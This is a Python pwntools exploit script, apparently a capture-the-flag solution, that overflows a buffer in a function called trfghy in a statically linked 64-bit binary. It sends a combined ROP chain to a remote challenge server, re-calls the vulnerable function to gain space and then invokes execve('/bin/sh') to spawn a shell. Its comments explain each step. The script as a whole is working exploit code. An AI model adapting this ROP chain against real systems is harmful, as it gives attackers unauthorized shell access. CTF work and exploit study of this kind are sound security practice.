from pwn import *

def main():
  trfghy  = 0x40106e
  poprdi  = 0x4016d3
  poprsx  = 0x4374a9
  poprax  = 0x46b6b8
  syscall = 0x45b775
  binsh   = 0x493821

  # The binary is 64-bit and statically linked with NX and ASLR.
  # We have an obvious buffer overflow in the `trfghy` function.

  # We only have 24 bytes to play with at first, but we can get
  # more by calling trfghy again, with a larger argument.
  # Arguments are passed using a pop rdi gadget.

  # Once we re-call `trfghy`, we can build a ROP chain to make
  # an execve syscall.
  # 59 --> rax (syscall number)
  # /bin/sh --> rdi (argument #1)
  # NULL --> rsi (argument #2)
  # NULL --> rdx (argument #3)

  # because the `read` function will read in newlines as well
  # it's easiest to combine the two rop chains as one long
  # rop chain

  local = 0
  if local:
    p = process('./again')
  else:
    p = remote('lox.xvm.mit.edu', 24001)

  # rop1 makes the trfghy(1000) call
  rop1 = "A" * 120 + p64(poprdi) + p64(1000) + p64(trfghy)

  # rop2 calls execve("/bin/sh", 0, 0)
  rop2 = "A" * 120 + p64(poprdi) + p64(binsh) \
                   + p64(poprsx) + p64(0) * 2 \
                   + p64(poprax) + p64(59)    \
                   + p64(syscall)

  p.sendline(rop1 + rop2)
  print p.recvall()
  # p.interactive()

if __name__ == '__main__':
  main()
